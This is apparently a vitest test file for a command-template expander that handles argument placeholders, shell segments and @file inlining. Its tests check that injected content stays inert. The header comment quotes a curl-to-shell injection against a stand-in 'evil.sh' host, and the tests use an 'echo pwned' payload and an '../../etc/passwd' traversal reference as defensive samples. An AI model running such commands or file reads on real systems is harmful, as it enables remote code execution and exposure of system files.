/**
 * T3.3 — the package that reads a custom command also interprets it.
 *
 * `loadCustomCommands` reads the file and its frontmatter and stops. Everything a command body
 * actually MEANS — `$1` placeholders, quote-aware argument splitting, `` !`shell` `` segments,
 * `@file` inlining under a 64 KB cap — lived downstream, in 112 LOC with zero framework imports.
 * That is a FORMAT convention shared by every custom-command implementation in this space, not
 * product policy, and the framework already owns the half that reads the file. One format, one
 * owner.
 *
 * ## The security shape, stated as tests rather than as prose
 *
 * `` !`shell` `` runs arbitrary commands from a file the user authored, so two invariants carry the
 * weight here and each has its own test:
 *
 *  - **The expander never spawns.** It calls the INJECTED `shell`, so the trust decision — is this
 *    directory trusted? — stays with the caller that already owns trust posture. An expander that
 *    spawned directly would move a trust boundary silently (`rules/system-design-guardrails.md`
 *    § G10).
 *  - **Expansion is SINGLE-PASS and what comes back is INERT** (EC-4). Output of `@file` and of
 *    `` !`shell` `` is never re-scanned. Otherwise a file containing `` !`curl evil.sh | sh` ``
 *    becomes execution triggered by a template that never named that command — and `@file`
 *    references get far less scrutiny than shell segments when a human reviews a template. Single
 *    pass makes the injection UNREPRESENTABLE rather than filtered, which is the difference between
 *    a rule and a blocklist.
 *
 * The third recurring shape: an unresolved reference NEVER survives into the output. A leaked `$3`
 * or `@missing.md` reads to the model as content the user wrote, so both substitute empty and warn.
 */
import { describe, expect, it, vi } from 'vitest'

import { expandCommandTemplate, templateHints } from '../../src/config/command-template.js'

const CAP = 64 * 1024

function deps(over: Partial<Parameters<typeof expandCommandTemplate>[2]> = {}) {
  return {
    shell: vi.fn(async (_cmd: string) => ({ text: 'SHELL_OUT', ok: true })),
    readFile: vi.fn((_name: string) => 'FILE_OUT' as string | undefined),
    warn: vi.fn((_m: string) => {}),
    ...over,
  }
}

describe('expandCommandTemplate — arguments', () => {
  it('test_numbered_placeholders_substitute_positionally', async () => {
    const d = deps()
    expect(await expandCommandTemplate('review $1 then $2', 'alpha beta', d)).toBe(
      'review alpha then beta',
    )
  })

  it('test_quoted_arguments_count_as_one', async () => {
    const d = deps()
    expect(await expandCommandTemplate('open $1|next $2', '"src/a b.ts" second', d)).toBe(
      'open src/a b.ts|next second',
    )
  })

  it('test_a_missing_placeholder_warns_and_substitutes_empty_never_leaks_the_literal', async () => {
    const d = deps()
    const out = await expandCommandTemplate('a $1 b $3 c', 'one', d)
    expect(out, 'a leaked $3 reads to the model as text the user wrote').not.toContain('$3')
    expect(out).toBe('a one b  c')
    expect(d.warn).toHaveBeenCalledTimes(1)
    expect(d.warn.mock.calls[0]?.[0]).toContain('$3')
  })
})

describe('expandCommandTemplate — shell segments', () => {
  it('test_shell_segments_call_the_injected_shell_and_never_spawn_directly', async () => {
    const d = deps()
    const out = await expandCommandTemplate('before !`git diff --stat` after', '', d)
    expect(d.shell).toHaveBeenCalledWith('git diff --stat')
    expect(out).toBe('before SHELL_OUT after')
  })

  it('test_a_failed_shell_segment_substitutes_its_output_and_warns_never_silence', async () => {
    // EC-13. Substituting silence turns a broken command into a prompt that reads as though it had
    // succeeded — a failure the model has no way to detect.
    const d = deps({ shell: vi.fn(async () => ({ text: 'command not found', ok: false })) })
    const out = await expandCommandTemplate('x !`nope` y', '', d)
    expect(out).toBe('x command not found y')
    expect(d.warn).toHaveBeenCalledTimes(1)
    expect(d.warn.mock.calls[0]?.[0]).toContain('nope')
  })

  it('test_shell_output_is_not_rescanned_for_placeholders_or_references', async () => {
    // EC-4, one half. Output carrying `$1` or `@x` must arrive as TEXT.
    const d = deps({ shell: vi.fn(async () => ({ text: 'got $1 and @secret.md', ok: true })) })
    const out = await expandCommandTemplate('!`echo x`', 'ARG', d)
    expect(out).toBe('got $1 and @secret.md')
    expect(
      d.readFile,
      'a reference inside shell output must not become a read',
    ).not.toHaveBeenCalled()
  })
})

describe('expandCommandTemplate — file references', () => {
  it('test_inlined_file_content_is_inert', async () => {
    // EC-4, the other half and the more dangerous one: `@file` gets far less scrutiny than a shell
    // segment when a human reviews a template.
    const d = deps({ readFile: vi.fn(() => 'do !`echo pwned` now') })
    const out = await expandCommandTemplate('@notes.md', '', d)
    expect(out).toBe('do !`echo pwned` now')
    expect(
      d.shell,
      'a shell segment inside an inlined file is TEXT — otherwise the template executes a command ' +
        'it never named',
    ).not.toHaveBeenCalled()
  })

  it('test_a_missing_file_reference_warns_and_substitutes_empty', async () => {
    // EC-11. Same rule as `$3`: an unresolved reference must not survive into the prompt.
    const d = deps({ readFile: vi.fn(() => undefined) })
    const out = await expandCommandTemplate('see @gone.md ok', '', d)
    expect(out).not.toContain('@gone.md')
    expect(out).toBe('see  ok')
    expect(d.warn.mock.calls[0]?.[0]).toContain('gone.md')
  })

  it('test_a_file_of_exactly_the_cap_is_inlined_whole', async () => {
    // EC-12. "Larger is truncated" leaves the equality case unstated, and that is where the
    // off-by-one lives.
    const exact = 'x'.repeat(CAP)
    const d = deps({ readFile: vi.fn(() => exact) })
    expect(await expandCommandTemplate('@big.md', '', d)).toBe(exact)
    expect(d.warn).not.toHaveBeenCalled()
  })

  it('test_one_byte_over_the_cap_is_truncated_with_a_warning', async () => {
    const over = 'x'.repeat(CAP + 1)
    const d = deps({ readFile: vi.fn(() => over) })
    const out = await expandCommandTemplate('@big.md', '', d)
    expect(out.length, 'truncated, never inlined whole and never silently dropped').toBeLessThan(
      over.length,
    )
    expect(out.length).toBeGreaterThan(0)
    expect(d.warn).toHaveBeenCalledTimes(1)
  })

  it('test_the_expander_does_not_resolve_paths_itself', async () => {
    // The reader is injected, so containment belongs to the caller that already owns it. A second
    // containment check that disagrees with the first is the `assertNoSymlinkEscape` class of bug
    // this ecosystem has already paid for once. The name is handed over verbatim — no join, no
    // normalise, no realpath.
    const d = deps()
    await expandCommandTemplate('@src/nested/a.ts', '', d)
    expect(d.readFile.mock.calls[0]?.[0]).toBe('src/nested/a.ts')
  })

  it('test_a_dotted_relative_reference_is_handed_over_whole', async () => {
    // History worth keeping: the reference pattern was first written with a nested quantifier
    // (`\.?[^\s`,.]*(?:\.[^\s`,.]+)*`), which the security lint correctly flagged as ReDoS —
    // catastrophic backtracking on a crafted reference. Replacing it with one linear class also
    // removed a quirk nobody had designed: the old pattern truncated `@../../etc/passwd` to `../`.
    //
    // Handing the whole name over is the right behaviour anyway. Deciding what a path is allowed to
    // reach belongs to the injected reader, which already owns containment; a regex that quietly
    // shortens the name is a containment rule in the wrong place, and one that disagrees with the
    // real one is the `assertNoSymlinkEscape` class of bug this ecosystem has already paid for.
    const d = deps()
    await expandCommandTemplate('@../../etc/passwd', '', d)
    expect(d.readFile.mock.calls[0]?.[0]).toBe('../../etc/passwd')
  })
})

describe('expandCommandTemplate — the one re-scan that is deliberate', () => {
  it('test_arguments_reach_inside_a_shell_segment', async () => {
    // Arguments are substituted BEFORE references are resolved, so `!`git diff $1`` works. That is
    // the safe direction: an argument is the user's direct input for this invocation — the thing
    // they typed the command to supply. The reverse — content the template merely pointed at
    // deciding what runs — is what the single scan above makes impossible.
    const d = deps()
    await expandCommandTemplate('!`git diff $1`', 'HEAD~1', d)
    expect(d.shell).toHaveBeenCalledWith('git diff HEAD~1')
  })
})

describe('templateHints', () => {
  it('test_hints_lists_the_declared_placeholders', () => {
    expect(templateHints('do $2 then $1 and $1 again')).toEqual(['$1', '$2'])
  })

  it('test_hints_of_a_template_without_placeholders_is_empty', () => {
    expect(templateHints('just prose')).toEqual([])
  })
})
